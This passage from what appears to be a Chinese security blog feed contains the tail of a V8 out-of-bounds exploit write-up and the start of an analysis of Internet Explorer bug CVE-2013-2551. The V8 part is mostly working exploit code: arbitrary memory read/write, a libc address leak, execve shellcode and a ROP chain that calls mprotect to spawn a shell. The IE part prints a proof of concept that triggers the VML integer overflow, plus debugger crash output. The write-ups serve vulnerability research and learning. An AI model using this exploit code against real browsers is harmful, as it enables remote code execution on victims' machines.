class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line"><span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line"><span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">&#125;</span><br><span class="line">d2u(val)&#123;</span><br><span class="line"><span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line"><span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line"><span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">u2d(val)&#123;</span><br><span class="line"><span class="keyword">let</span> tmp = [];</span><br><span class="line">tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line"><span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bufs = [];</span><br><span class="line"><span class="keyword">var</span> objs = [];</span><br><span class="line"><span class="keyword">var</span> oobArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray; &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">&#123;</span><br><span class="line">counter : <span class="number">0</span>,</span><br><span class="line">next() &#123;</span><br><span class="line"><span class="keyword">let</span> result = <span class="number">1.1</span>;</span><br><span class="line"><span class="keyword">this</span>.counter++;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">oobArray.length = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">100</span>;i++) &#123;</span><br><span class="line">bufs.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1234</span>));</span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="string">'a'</span>: <span class="number">0x4321</span>, <span class="string">'b'</span>: <span class="number">0x9999</span>&#125;;</span><br><span class="line">objs.push(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;&#125;<span class="comment">//没什么用，但是去掉后栈的位置会迷之提高（地址偏低），导致后面布置ROP失败</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; <span class="number">1000</span>;i++) &#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的buf在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> buf_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x123400000000</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"buf_offset: "</span> + i.toString());</span><br><span class="line">buf_offset = i;</span><br><span class="line">oobArray[i] = mem.u2d(<span class="number">0x121200000000</span>);<span class="comment">//修改可控buf的size，做个标记</span></span><br><span class="line">oobArray[i + <span class="number">3</span>] = mem.u2d(<span class="number">0x1212</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可控的obj在oobArray的第i个元素处</span></span><br><span class="line"><span class="keyword">let</span> obj_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; maxSize; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = mem.d2u(oobArray[i]);</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x432100000000</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"obj_offset: "</span> + i.toString());</span><br><span class="line">obj_offset = i;</span><br><span class="line">oobArray[i] = mem.u2d(<span class="number">0x567800000000</span>); <span class="comment">//修改可控obj的属性a，做个标记</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// bufs中的第i个buf是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_buf_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; bufs.length; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = bufs[i].byteLength;</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x1212</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"found controllable buf at idx "</span> + i.toString());</span><br><span class="line">controllable_buf_idx = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// objs中第i个obj是可控的</span></span><br><span class="line"><span class="keyword">let</span> controllable_obj_idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; objs.length; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> val = objs[i].a;</span><br><span class="line"><span class="keyword">if</span>(val === <span class="number">0x5678</span>)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"found controllable obj at idx "</span> + i.toString());</span><br><span class="line">controllable_obj_idx = i;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> heap_addr = mem.d2u(oobArray[buf_offset + <span class="number">1</span>]) - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"heap_addr: 0x"</span> + heap_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">arbitraryRW</span></span>&#123;</span><br><span class="line"><span class="keyword">constructor</span>(buf_offset, buf_idx, obj_offset, obj_idx)&#123;</span><br><span class="line"><span class="keyword">this</span>.buf_offset = buf_offset;</span><br><span class="line"><span class="keyword">this</span>.buf_idx = buf_idx;</span><br><span class="line"><span class="keyword">this</span>.obj_offset = obj_offset;</span><br><span class="line"><span class="keyword">this</span>.obj_idx = obj_idx;</span><br><span class="line">&#125;</span><br><span class="line">leak_obj(obj)&#123;</span><br><span class="line">objs[<span class="keyword">this</span>.obj_idx].a = obj;</span><br><span class="line"><span class="keyword">return</span> mem.d2u(oobArray[<span class="keyword">this</span>.obj_offset]) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">read(addr)&#123;</span><br><span class="line"><span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line"><span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">return</span> mem.d2u(tmp[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">write(addr, val)&#123;</span><br><span class="line"><span class="keyword">let</span> idx = <span class="keyword">this</span>.buf_offset;</span><br><span class="line">oobArray[idx + <span class="number">1</span>] = mem.u2d(addr);</span><br><span class="line">oobArray[idx + <span class="number">2</span>] = mem.u2d(addr);</span><br><span class="line"><span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(bufs[<span class="keyword">this</span>.buf_idx], <span class="number">0</span>, <span class="number">0x10</span>);</span><br><span class="line">tmp.set([mem.u2d(val)]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arw = <span class="keyword">new</span> arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> curr_chunk = heap_addr;</span><br><span class="line"><span class="keyword">let</span> searched = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x5000</span>; i++)&#123;</span><br><span class="line"><span class="keyword">let</span> size = arw.read(curr_chunk + <span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> prev_size = arw.read(curr_chunk);</span><br><span class="line"><span class="keyword">if</span>(size !== <span class="number">0</span> &amp;&amp; size % <span class="number">2</span> === <span class="number">0</span> &amp;&amp; prev_size &lt;= <span class="number">0x3f0</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> tmp_ptr = curr_chunk - prev_size;</span><br><span class="line"><span class="keyword">let</span> fd = arw.read(tmp_ptr + <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">let</span> bk = arw.read(tmp_ptr + <span class="number">0x18</span>)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">parseInt</span>(fd / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">searched = fd;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">parseInt</span>(bk / <span class="number">0x10000000000</span>) === <span class="number">0x7f</span>)&#123;</span><br><span class="line">searched = bk;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(size &lt; <span class="number">0x20</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">size = <span class="built_in">parseInt</span>(size / <span class="number">8</span>) * <span class="number">8</span></span><br><span class="line">curr_chunk += size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(searched !== <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> libc_base = <span class="built_in">parseInt</span>((searched - <span class="number">0x3c4000</span>) / <span class="number">0x1000</span>) * <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"searched libc_base: 0x"</span> + libc_base.toString(<span class="number">16</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Not found"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">//修改malloc_hook实现getshell</span></span><br><span class="line"><span class="comment">malloc_hook = 0x3c4b10 + libc_base;</span></span><br><span class="line"><span class="comment">one_gadet = 0x4526a + libc_base;</span></span><br><span class="line"><span class="comment">arw.write(malloc_hook, [mem.u2d(one_gadet)]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> environ_addr = libc_base + <span class="number">0x3C6F38</span>;</span><br><span class="line"><span class="keyword">let</span> stack_addr = arw.read(environ_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"stack_addr: 0x"</span> + stack_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> sc = [<span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0xd1</span>, <span class="number">0x9d</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xd0</span>, <span class="number">0x8c</span>, <span class="number">0x97</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xdb</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x99</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x5e</span>, <span class="number">0xb0</span>, <span class="number">0x3b</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>];</span><br><span class="line"><span class="keyword">let</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">2048</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; sc.length; i++)&#123;</span><br><span class="line">shellcode[i] = sc[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shell_addr = arw.read(arw.leak_obj(shellcode) + <span class="number">0x68</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shell_addr: 0x"</span> + shell_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> retn = <span class="number">0x000000000007EF0D</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdi = <span class="number">0x0000000000021102</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rsi = <span class="number">0x00000000000202e8</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> pop_rdx = <span class="number">0x0000000000001b92</span> + libc_base;</span><br><span class="line"><span class="keyword">let</span> mprotect = <span class="number">0x0000000000101770</span> +libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop =  [</span><br><span class="line">pop_rdi,</span><br><span class="line"><span class="built_in">parseInt</span>(shell_addr / <span class="number">0x1000</span>) * <span class="number">0x1000</span>,</span><br><span class="line">pop_rsi,</span><br><span class="line"><span class="number">4096</span>,</span><br><span class="line">pop_rdx,</span><br><span class="line"><span class="number">7</span>,</span><br><span class="line">mprotect,</span><br><span class="line">shell_addr</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rop_start = stack_addr - <span class="number">8</span> * (rop.length + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; rop.length; i++) &#123;</span><br><span class="line">arw.write(rop_start + <span class="number">8</span> * i, rop[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">rop_start -= <span class="number">8</span>;</span><br><span class="line">arw.write(rop_start, retn);</span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">"done"</span>);</span><br></pre></td></tr></table></figure><p></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>虽然写完了exp，但是还是有一个玄学问题没有解决，在exp中必须要添加一个没什么用的函数并jit优化它，然后才能成功getshell。如果将它去掉，那么在最后”栈喷”的时候，程序的rsp距离我们泄露的栈地址贼远，没办法喷过去2333，调了很久也没弄清楚原因，希望有大佬知道的话能够告知一下。<br>（萌新刚入门，文章如果有错误请师傅们谅解，如果发现我一定更正。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><h2 id="v8基础"><a href="#v8基础" class="headerlink" title="v8基础"></a>v8基础</h2><ul><li><a href="http://eternalsakura13.com/2018/05/06/v8/" target="_blank" rel="noopener">sakura师傅的《v8 exploit》</a></li><li><a href="https://zhuanlan.zhihu.com/p/24982678" target="_blank" rel="noopener">V8 Object 内存结构与属性访问详解</a></li><li><a href="https://hijiangtao.github.io/2018/06/17/Shapes-ICs/" target="_blank" rel="noopener">[译] JavaScript 引擎基础：Shapes 和 Inline Caches</a></li><li><a href="http://www.jayconrod.com/posts/52/a-tour-of-v8-object-representation" target="_blank" rel="noopener">A tour of V8: object representation</a></li><li><a href="https://v8.dev/blog/fast-properties" target="_blank" rel="noopener">Fast properties in V8</a></li></ul><h2 id="v8利用"><a href="#v8利用" class="headerlink" title="v8利用"></a>v8利用</h2><ul><li><a href="http://eternalsakura13.com/2018/11/19/justintime/" target="_blank" rel="noopener">Google CTF justintime exploit</a></li><li><a href="https://www.anquanke.com/post/id/147829#h3-3" target="_blank" rel="noopener">扔个骰子学v8 - 从Plaid CTF roll a d8开始</a></li><li><a href="https://github.com/Hpasserby/aSiagaming/tree/master/Chrome-v8-PCTF-roll-a-d8" target="_blank" rel="noopener">aSiagaming-PCTF 2018 Roll a d8</a></li></ul><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
            <tag> OOB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IE整数溢出漏洞[cve-2013-2551]分析</title>
      <link href="/post/ef2727d8.html"/>
      <url>/post/ef2727d8.html</url>
      
        <content type="html"><![CDATA[<!-- build time:Tue Jun 25 2019 02:56:37 GMT+0800 (中国标准时间) --><blockquote><p>调试的第二个洞，深刻的体会到了自己调试功底有多弱，在写这篇笔记的时候才理清调试思路。。。<br>这个洞说是整数溢出，我感觉主要还是在整数溢出造成的越界访问上。<br><a id="more"></a></p></blockquote><p><img src="/post/ef2727d8/pwn.gif" alt="pwn.gif"></p><h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul><li>windows7 32位(IE版本: 8.0.7600.16385)</li><li>windbg</li><li>Immunity Debugger<blockquote><p>这个洞在win8 + IE10下依然可以触发并利用</p></blockquote></li></ul><h1 id="POC调试"><a href="#POC调试" class="headerlink" title="POC调试"></a>POC调试</h1><p><strong>poc代码：</strong><br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"x-ua-compatible"</span> <span class="attr">content</span>=<span class="string">"IE=EmulateIE9"</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>POC by VUPEN<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined">v\: * &#123; behavior:url(#default#VML); display:inline-block &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">xml:namespace</span> <span class="attr">ns</span>=<span class="string">"urn:schemas-microsoft-com:vml"</span> <span class="attr">prefix</span>=<span class="string">"v"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"createRects(); exploit();"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">v:stroke</span> <span class="attr">id</span>=<span class="string">"vml1"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">v:oval</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> rect_array = <span class="keyword">new</span> <span class="built_in">Array</span>()</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Array</span>()</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">createRects</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">rect_array[i]    = <span class="built_in">document</span>.createElement(<span class="string">"v:shape"</span>)</span></span><br><span class="line"><span class="javascript">rect_array[i].id = <span class="string">"rect"</span> + i.toString()</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(rect_array[i])</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> vml1  = <span class="built_in">document</span>.getElementById(<span class="string">"vml1"</span>)</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">a[i] = <span class="built_in">document</span>.getElementById(<span class="string">"rect"</span> + i.toString())._vgRuntimeStyle;  <span class="comment">//获取_vgRuntimeStyle属性</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">a[i].rotation;  <span class="comment">//第一次访问rotation属性，创建COARuntimeStyle对象 大小为0xAC(0xB0) 在偏移为0x58处为marginLeft</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (i == <span class="number">0x300</span>) &#123;   <span class="comment">//在COARuntimeStyle中间创建一个包含44个元素的dashstyle数组（ORG数组），分配4*44 = 0xb0大小的空间</span></span></span><br><span class="line"><span class="javascript">vml1.dashstyle = <span class="string">"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44"</span></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">vml1.dashstyle.array.length = <span class="number">0</span> - <span class="number">1</span>;   <span class="comment">//整数溢出</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">0x400</span>; i++)   &#123;     </span></span><br><span class="line"><span class="javascript">a[i].marginLeft = <span class="string">"hpasserby"</span>;  <span class="comment">//设置marginLeft的值，用于判断该对象是否紧接在dashstyle（ORG数组）之后。</span></span></span><br><span class="line"><span class="undefined">marginLeftAddress = vml1.dashstyle.array.item(0x2E+0x16);</span></span><br><span class="line"><span class="javascript"><span class="keyword">if</span> (marginLeftAddress &gt; <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="undefined">vml1.dashstyle.array.item(0x2E+0x16) = 0x41414141;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h2 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h2><p>首先开启HPA选项，在上一篇博客中提到过</p><blockquote><p><code>gflag.exe -i iexplore.exe +hpa</code></p></blockquote><p>使用windbg进行调试，程序中断在以下位置<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; g</span><br><span class="line">(d14.e8c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=1a53f064 ebx=6acc4964 ecx=00000001 edx=00000000 esi=1a53f060 edi=0463be4c</span><br><span class="line">eip=766c9966 esp=0463be08 ebp=0463be10 iopl=0         nv up ei ng nz ac pe cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010297</span><br><span class="line">msvcrt!memcpy+0x158:</span><br><span class="line">766c9966 8b448efc        mov     eax,dword ptr [esi+ecx*4-4] ds:0023:1a53f060=????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0463be10 6ac6cfa9 0463be4c 1a53f060 00000004 msvcrt!memcpy+0x158</span><br><span class="line">0463be24 6acbda0f 1b1d2fe8 0463be4c 00000044 vgx!ORG::Get+0x27</span><br><span class="line">0463be50 764a3ec3 1b1d2fe8 00000044 0463beb4 vgx!COALineDashStyleArray::get_item+0x8c</span><br><span class="line">0463be70 764a3d3d 1b3daff0 00000024 00000004 OLEAUT32!DispCallFunc+0x165</span><br><span class="line">0463bf00 6aca47c1 08829454 1b3daff0 00000000 OLEAUT32!CTypeInfo2::Invoke+0x23f</span><br><span class="line">0463c08c 6acc4a88 1b3daff4 1b3daff0 6ace223c vgx!COADispatch::Invoke+0x89</span><br><span class="line">0463c0c0 68c3db38 1b3daff0 00000000 68c30adc vgx!COADispatchImpl&lt;IVgDashStyleArray,&amp;IID_IVgDashStyleArray,COAShapeProg&gt;::Invoke+0x2f</span><br><span class="line">0463c100 68c3da8c 092ecd10 00000000 00000409 jscript!IDispatchInvoke2+0xf0</span><br><span class="line">0463c13c 68c3d9ff 092ecd10 00000409 00000003 jscript!IDispatchInvoke+0x6a</span><br><span class="line">0463c1fc 68c3db8a 092ecd10 00000000 00000003 jscript!InvokeDispatch+0xa9</span><br></pre></td></tr></table></figure><p></p><p>可以看到，crash的原因是访问了非法内存，查看该内存附近区域<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd 1a53f060-100 l50</span><br><span class="line">1a53ef60  00000005 00000006 00000007 00000008</span><br><span class="line">1a53ef70  00000009 0000000a 0000000b 0000000c</span><br><span class="line">1a53ef80  0000000d 0000000e 0000000f 00000010</span><br><span class="line">1a53ef90  00000011 00000012 00000013 00000014</span><br><span class="line">1a53efa0  00000015 00000016 00000017 00000018</span><br><span class="line">1a53efb0  00000019 0000001a 0000001b 